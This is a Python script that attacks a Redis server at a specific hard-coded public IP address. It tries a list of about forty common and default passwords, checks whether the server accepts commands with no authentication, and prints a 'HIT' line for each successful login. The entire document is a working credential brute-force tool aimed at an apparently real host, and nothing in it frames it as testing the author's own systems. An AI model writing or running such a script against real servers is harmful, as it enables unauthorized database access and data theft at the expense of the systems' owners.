import socket

host, port = "221.231.138.20", 6379
passwords = ["", "123456", "admin", "redis", "password", "admin123", "root", 
    "12345678", "123456789", "test", "guest", "abc123", "111111", "000000", 
    "666666", "888888", "passw0rd", "P@ssw0rd", "foobared", "master", "1234", 
    "redis123", "qwerty", "letmein", "monkey", "dragon", "iloveyou", "princess", 
    "1234567890", "1234567", "sunshine", "football", "baseball", "welcome", 
    "shadow", "654321", "password1", "qwerty123", "trustno1"]

for pw in passwords:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((host, port))
        if pw:
            s.send(f"AUTH {pw}\r\n".encode())
            resp = s.recv(1024).decode("utf-8", errors="replace").strip()
            if "+OK" in resp:
                s.send(b"PING\r\n")
                ping_resp = s.recv(1024).decode("utf-8", errors="replace").strip()
                print(f"[HIT] Redis {host}:{port} password=\"{pw}\" -> {ping_resp}")
        else:
            s.send(b"PING\r\n")
            resp = s.recv(1024).decode("utf-8", errors="replace").strip()
            if "+PONG" in resp:
                print(f"[HIT] Redis {host}:{port} NO AUTH required")
        s.close()
    except ConnectionRefusedError:
        print(f"[DEAD] Redis {host}:{port} connection refused")
        break
    except socket.timeout:
        print(f"[DEAD/Timeout] Redis {host}:{port}")
        break
    except Exception as e:
        if "refused" in str(e) or "timed" in str(e).lower():
            print(f"[DEAD] Redis {host}:{port} - {e}")
            break
        pass
print("[DONE] Redis test")
